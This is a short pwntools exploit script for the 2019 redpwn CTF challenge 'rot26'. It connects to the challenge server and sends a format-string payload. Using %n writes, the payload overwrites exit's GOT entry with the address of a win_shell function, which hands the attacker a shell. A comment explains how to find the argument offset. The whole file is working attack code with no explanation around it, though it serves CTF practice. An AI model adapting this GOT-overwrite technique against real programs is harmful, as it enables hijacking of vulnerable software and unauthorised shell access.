from pwn import *


p = remote('chall2.2019.redpwn.net', '4003')
#p = process('./rot26')

win_shell = 0x08048737
exit_got = 0x804a020

#use python -c "print "AAAA "+"%x "*10+"BBBB "" | ./rot26 can find out the offset.

payload = ""
payload += p32(exit_got)
payload += p32(exit_got+2)
payload += "%34607x"
payload += "%7$n"
payload += "%32973x"
payload += "%8$n"


print payload
p.interactive()


